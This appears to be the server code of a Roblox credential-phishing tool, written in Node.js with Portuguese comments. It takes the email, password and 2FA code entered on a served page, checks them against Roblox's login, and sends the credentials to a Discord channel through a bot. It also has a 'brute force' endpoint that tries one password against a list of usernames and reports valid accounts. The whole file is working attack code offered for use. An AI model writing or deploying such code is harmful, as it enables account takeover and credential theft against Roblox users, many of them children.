const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits } = require('discord.js');

const app = express();
const port = process.env.PORT || 3000;

// --- CONFIGURAÇÕES DO BOT ---
// O teu Token já está aqui
// No server.js, substitua a linha do token por isto:
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

// ATENÇÃO: Coloca aqui o ID do CANAL onde o bot vai escrever
// Exemplo: "1534955637593866271" (Clica no canal no Discord > Copiar ID)
const CHANNEL_ID = "1533498302845157608"; 

// Inicializar o Bot
const client = new Client({ intents: [GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

let isBotReady = false;

client.on('ready', () => {
    console.log(`✅ Bot conectado como ${client.user.tag}!`);
    isBotReady = true;
});

client.login(DISCORD_TOKEN);

app.use(express.json());
app.use(express.static('.'));

// Função para enviar mensagem via BOT
async function sendDiscordMessage(content) {
    return new Promise((resolve, reject) => {
        const sendMessage = async () => {
            try {
                const channel = await client.channels.fetch(CHANNEL_ID);
                if (channel) {
                    await channel.send({
                        content: content,
                        username: "Roblox Bot",
                        avatarURL: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
                    });
                    console.log("Mensagem enviada ao Discord!");
                    resolve(true);
                } else {
                    console.error("Canal não encontrado! Verifique o CHANNEL_ID.");
                    reject("Canal não encontrado");
                }
            } catch (error) {
                console.error("Erro ao enviar mensagem:", error);
                reject(error);
            }
        };

        if (isBotReady) {
            sendMessage();
        } else {
            // Se o bot ainda estiver carregando, espera um pouco
            setTimeout(() => {
                if (isBotReady) {
                    sendMessage();
                } else {
                    reject("Bot ainda não estava pronto");
                }
            }, 2000);
        }
    });
}

// Função para verificar se o Usuário existe (API de Busca Robusta)
async function checkUserExists(username) {
    try {
        const response = await axios.get('https://www.roblox.com/users/search', {
            params: { query: username, limit: 1, offset: 0 },
            headers: { 'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest' },
            timeout: 5000
        });
        
        if (response.data && response.data.Users && response.data.Users.length > 0) {
            const user = response.data.Users[0];
            // Verifica se o nome é exatamente o mesmo (case-insensitive)
            if (user.Name.toLowerCase() === username.toLowerCase()) {
                return { exists: true, id: user.Id, displayName: user.DisplayName, name: user.Name };
            }
        }
        return { exists: false };
    } catch (error) {
        return { exists: false };
    }
}

// Função para tentar Login no Roblox
async function tryLogin(email, password) {
    const baseUrl = "https://www.roblox.com";
    const robloxClient = axios.create({
        baseURL: baseUrl,
        timeout: 10000,
        headers: {
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        }
    });
    try {
        await robloxClient.get('/');
        const response = await robloxClient.post('/users/login', {
            username: email,
            password: password
        }, {
            headers: { 'Content-Type': 'application/json' },
            validateStatus: status => status < 500
        });
        
        const data = response.data;
        if (data.id && typeof data.id === 'number') {
            return { success: true, username: data.username, id: data.id };
        }
        return { success: false, error: data.error || "Senha Errada" };
    } catch (e) {
        return { success: false, error: "Erro de Conexão" };
    }
}

// ENDPOINT DE LISTA (BRUTE FORCE)
app.post('/check-list', async (req, res) => {
    const { list, password } = req.body;
    
    if (!list || !Array.isArray(list) || list.length === 0) {
        return res.json({ success: false, error: "Lista vazia" });
    }

    const results = [];
    let foundCount = 0;
    // Limitamos a 20 para não travar o servidor
    const maxChecks = list.slice(0, 20);

    for (const usernameOrEmail of maxChecks) {
        const cleanName = usernameOrEmail.trim();
        const userCheck = await checkUserExists(cleanName);

        if (userCheck.exists) {
            foundCount++;
            results.push({ status: "FOUND", username: userCheck.name, id: userCheck.id, original: cleanName });
            
            // Se tiver senha, tenta login para confirmar
            if (password) {
                const loginResult = await tryLogin(cleanName, password);
                if (loginResult.success) {
                    await sendDiscordMessage(
                        `**✅ CONTA VÁLIDA COM SENHA!**\n**User:** ${loginResult.username}\n**Email/Name:** ${cleanName}\n**Senha:** ${password}`
                    );
                    results[results.length -  1].loginConfirmed = true;
                }
            }
        } else {
            results.push({ status: "NOT_FOUND", original: cleanName });
        }
        // Pausa de 200ms entre cada verificação
        await new Promise(r => setTimeout(r, 200));
    }

    await sendDiscordMessage(`**📊 RESULTADO DA VERIFICAÇÃO**\n**Total:** ${maxChecks.length} | **Encontradas:** ${foundCount}`);

    return res.json({ success: true, results: results, found: foundCount });
});

// ENDPOINT DE LOGIN ÚNICO
app.post('/check', async (req, res) => {
    const { email, password, code2fa, isFinalStep } = req.body;

    if (isFinalStep) {
        await sendDiscordMessage(`**🔒 LOGIN COMPLETO (2FA)**\n**Email:** ${email}\n**Code:** ${code2fa}`);
        return res.json({ success: true });
    }

    if (!email || !password) {
        return res.json({ success: false, error: "Falta Email ou Senha" });
    }

    const result = await tryLogin(email, password);

    if (result.success) {
        await sendDiscordMessage(`**✅ CONTA VÁLIDA!**\n**User:** ${result.username}\n**Email:** ${email}\n**Senha:** ${password}`);
        return res.json({ success: true, username: result.username, userId: result.id, error: "" });
    } else {
        await sendDiscordMessage(`**❌ LOGIN FALHOU**\n**Email:** ${email}\n**Erro:** ${result.error}`);
        return res.json({ success: false, username: email, userId: "Unknown", error: result.error });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
